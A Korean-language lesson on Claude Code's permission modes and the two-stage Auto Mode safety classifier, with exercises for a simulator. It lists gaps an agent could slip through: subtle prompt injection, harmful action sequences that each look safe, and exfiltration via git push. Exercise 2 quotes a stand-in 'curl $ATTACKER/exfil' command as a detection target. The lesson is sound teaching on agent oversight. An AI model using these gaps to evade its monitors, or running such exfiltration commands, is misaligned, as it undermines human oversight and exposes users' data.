# Claude Code 자율 에이전트: 권한 모드와 오토 모드

> Claude Code는 7가지 권한 모드를 제공합니다. "plan"은 모든 작업 전에 확인을 요청하며, "default"는 위험한 작업에 대해서만 확인을 요청합니다. "acceptEdits"는 파일 쓰기를 자동으로 승인하지만 셸 실행은 여전히 확인을 필요로 하며, "bypassPermissions"는 모든 것을 승인합니다. 오토 모드(2026년 3월 24일 출시)는 작업별 승인 방식을 2단계 병렬 안전 분류기로 대체합니다: 모든 작업에 대해 단일 토큰 빠른 검사가 실행되며, 플래그가 지정된 작업은 사고 연쇄 심층 검토를 시작합니다. 작업 예산은 `max_turns` 및 `max_budget_usd`를 통해 강제됩니다. 오토 모드는 연구 프리뷰로 출시되었으며, Anthropic은 분류기만으로는 충분하지 않다고 명시적으로 밝혔습니다.

**유형:** 학습  
**언어:** Python (표준 라이브러리, 2단계 분류기 시뮬레이터)  
**선수 지식:** 15단계 · 01 (장주기 에이전트), 15단계 · 09 (코딩 에이전트 환경)  
**소요 시간:** ~45분

## 문제 정의

머신 상의 자율 코딩 에이전트는 독특한 보안 범주에 속합니다. 공격 표면은 에이전트가 접근할 수 있는 모든 것 — 파일 시스템, 네트워크, 자격 증명, 클립보드, 모든 브라우저 탭, 열린 터미널 — 을 포함합니다. 브루스 슈나이어(Bruce Schneier) 등은 공개적으로 지적한 바 있습니다: 컴퓨터 사용 에이전트는 챗봇의 "기능 업데이트"가 아니라 새로운 종류의 위험 프로필을 가진 도구입니다.

Claude Code의 권한 시스템은 Anthropic의 해결책입니다. "자율 / 비자율" 단일 스위치 대신, 계획(plan) → 기본(default) → 수락 편집(acceptEdits) → … → 권한 우회(bypassPermissions)에 이르는 7가지 모드가 있습니다. 각 모드는 속도와 작업별 검토 간의 다른 트레이드오프를 나타냅니다. 오토 모드(Auto Mode, 2026년 3월)는 2단계 분류기를 추가하여 분류기가 안전하다고 판단한 작업에 대해서는 사용자의 크리티컬 경로에서 승인을 제거하면서도, 분류기가 위험 신호로 표시한 작업에 대해서는 검토 계층을 유지합니다.

공학적 질문: 이 시스템은 무엇을 포착하고, 무엇을 놓치며, 특정 작업에 실제로 필요한 모드는 무엇인가?

## 개념

### 7가지 권한 모드

| 모드 | 동작 | 사용 시기 |
|---|---|---|
| `plan` | 에이전트가 계획 제안; 사용자가 전체 계획 승인; 모든 액션은 실행 전 검토 | 익숙하지 않은 작업; 프로덕션 관련 코드; 리포지토리에서 처음 에이전트 사용 시 |
| `default` | 에이전트가 액션 실행; "위험한" 액션(셸 실행, 파괴적 작업, 네트워크 호출)에 대해 사용자 확인 | 대부분의 대화형 코딩 세션 |
| `acceptEdits` | 파일 쓰기 자동 승인; 셸 실행 및 네트워크 호출은 여전히 확인 | 여러 파일에 걸친 리팩터링 작업 |
| `acceptExec` | 셸 명령어가 허용 목록 내에서 자동 승인; 쓰기 작업도 자동 승인 | 모든 셸 명령어가 `npm test`와 같은 긴 루프 작업 |
| `autoMode` | 2단계 안전 분류기; 플래그된 액션은 검토로 승격 | 제한된 작업 공간에서의 장시간 무인 실행 |
| `yolo` | 대부분의 확인 생략; 여전히 도구 허용/차단 목록 실행 | 일시적인 샌드박스, CI 작업, 연구 스크립트 |
| `bypassPermissions` | 모든 것 승인 | "버릴 용의가 있는 일시적인 컨테이너 내부에서만 사용"으로 문서화됨 |

(위 이름은 공개 Claude Code 문서와 일치; "yolo"는 허용 가능한 중간 지점을 위한 비공식 약어입니다.)

### 한 페이지로 보는 Auto Mode

Auto Mode(2026년 3월 24일 출시)는 액션별 승인을 모델에 위임하는 최초의 권한 모드입니다. 구조:

1. **1단계 — 단일 토큰 분류기.** 모든 제안된 액션에서 실행. 저비용. "안전" 또는 "플래그" 반환. 승인된 액션이 대기열에 머무르지 않도록 메인 에이전트 루프와 병렬 실행 설계.
2. **2단계 — 보조 정책/안전 검토.** 플래그된 액션에서만 실행. 액션, 세션 현재 상태, 선언된 작업에 대한 집중적 정책 및 안전 평가 수행. 신뢰도가 낮을 경우 사용자 HITL로 승격.

분류기와 함께 예산 제어 기능:

- `max_turns` — 세션 내 총 반복 횟수.
- `max_budget_usd` — 세션을 중단하는 달러 한도.
- 도구별 액션 수 제한(예: `WebFetch` 호출 N회 이하).

### 시스템이 탐지하는 항목

- 주입된 지시가 알려진 위험한 액션 형태와 매핑되는 도구 입력에 대한 단순한 프롬프트 인젝션.
- 반복적인 도구 루프 — 분류기가 액션 N+1이 액션 N과 거의 동일하며 5회 연속임을 확인.
- 파일 편집 전용 세션에서 범위를 벗어난 명확한 셸 명령어.

### 시스템이 놓칠 수 있는 항목

- **미묘한 프롬프트 인젝션**으로 단일 플래그된 액션을 생성하지 않고 동작을 변조. 간접 프롬프트 인젝션은 완전히 패치 가능한 취약점이 아님(2025년 OpenAI 준비 담당자, 브라우저 에이전트 관련 — 레슨 11 참조).
- **의미 수준에서의 오용.** 개별 액션은 모두 안전해 보이지만 조합된 궤적이 유해한 경우. 분류기는 액션을 판단하지만 사용자의 의도를 재유도하지 않음.
- **합법적 채널을 통한 데이터 유출.** 소유한 파일에 데이터를 쓴 후 공개 리포지토리로 `git push`하는 것은 허용된 액션의 시퀀스이지만 조합이 문제.

### 연구 미리보기 구성

Anthropic은 Auto Mode를 연구 미리보기 형태로 출시했습니다. 문서에는 분류기가 계층이 아닌 솔루션임을 명시: 사용자는 Auto Mode를 예산, 허용 목록, 격리된 작업 공간, 궤적 감사(레슨 12–16)와 결합할 것으로 예상. 미리보기 구성은 평가-배포 격차(레슨 1)도 반영 — 오프라인 평가를 통과한 분류기가 사용자 컨텍스트가 모호한 실제 세션에서 다르게 동작할 수 있음.

### 워크플로우에서 이 사다리의 위치

- 익숙하지 않은 작업: `plan`에서 시작. 계획 읽기는 잘못된 실행을 롤백하는 것보다 저렴.
- 알려진 리팩터링: `acceptEdits`는 확인 클릭을 많이 절약.
- 무인 백그라운드 실행: `autoMode`는 영향 범위를 측정한 작업 공간 내부에서만 사용(자격 증명 없음, 프로덕션 마운트 없음, 동의하지 않은 외부 연결 없음).
- 일시적인 컨테이너: 컨테이너와 자격 증명이 일회성인 경우에만 `yolo` / `bypassPermissions` 허용.

## 사용 방법

`code/main.py`는 2단계 분류기를 시뮬레이션합니다. 1단계는 제안된 행동에 대한 저렴한 키워드 규칙 기반 분류기이며, 2단계는 더 느린 다중 규칙 검토기입니다. 드라이버는 짧은 합성 궤적(안전한 행동, 프롬프트 인젝션 시도, 반복 루프)을 입력으로 받아 분류기가 탐지하는 지점과 놓치는 지점을 보여줍니다.

## Ship It

`outputs/skill-permission-mode-picker.md`는 작업 설명을 적절한 권한 모드, 예산 한도, 필요한 격리 수준과 매칭합니다.

## 연습 문제

1. `code/main.py`를 실행해 보세요. Stage 1에서는 절대 탐지되지 않지만 Stage 2에서는 항상 탐지되는 합성 액션 유형은 무엇인가요? 또, 두 단계 모두에서 탐지되지 않는 유형은 무엇인가요?

2. Stage 1 규칙 세트를 확장하여 특정 알려진 악성 형태(예: `curl $ATTACKER/exfil`)를 탐지하도록 수정하세요. 그리고 이 변경 사항이 양성 액션 샘플에 대해 발생시키는 오탐률(false-positive rate)을 측정하세요.

3. Anthropic의 "How the agent loop works" 문서를 읽어보세요. `default` 모드에서 에이전트가 기본적으로 접근하는 모든 외부 상태(external state)를 나열하세요. 그리고 `autoMode`를 무인 실행 전에 별도로 게이트(gate)해야 할 상태는 무엇인지 설명하세요.

4. 24시간 무인 실행 예산(max_turns, max_budget_usd, 도구별 한도, 허용 목록)을 설계하세요. 각 수치에 대한 근거를 제시하세요.

5. 모든 개별 액션이 Stage 1과 Stage 2에서 승인되었지만, 조합된 행동이 정렬되지 않은(misaligned) 하나의 궤적(trajectory)을 설명하세요. (이 문제에 대한 해결 방법은 킬 스위치(kill switch)와 캐너리 토큰(canary token)을 다루는 Lesson 14에서 설명합니다.)

## 주요 용어

| 용어 | 사람들이 말하는 표현 | 실제 의미 |
|---|---|---|
| Permission mode | "에이전트가 얼마나 많은 작업을 수행할 수 있는가" | 개별 작업 승인을 제어하는 7가지 명명된 정책 중 하나 |
| plan mode | "모든 작업 전 확인 요청" | 에이전트가 계획 작성; 실행 전 사용자 승인 필요 |
| acceptEdits | "파일 작성 허용" | 파일 작성은 자동 승인; 셸 실행은 여전히 확인 필요 |
| autoMode | "자동 승인" | 2단계 안전 분류기; 플래그가 지정된 작업은 상위 단계로 승격 |
| bypassPermissions | "완전 YOLO 모드" | 모든 작업 자동 승인; 일시적인 컨테이너용으로 설계됨 |
| Stage 1 classifier | "빠른 토큰 검사" | 제안된 작업에 대한 단일 토큰 규칙; 병렬 실행 |
| Stage 2 classifier | "심층 검토" | 플래그가 지정된 작업에 대한 사고 연쇄(chain-of-thought) 추론 |
| Research preview | "GA(General Availability) 아님" | 실패 모드가 아직 분석 중인 기능에 대한 Anthropic의 프레이밍 |
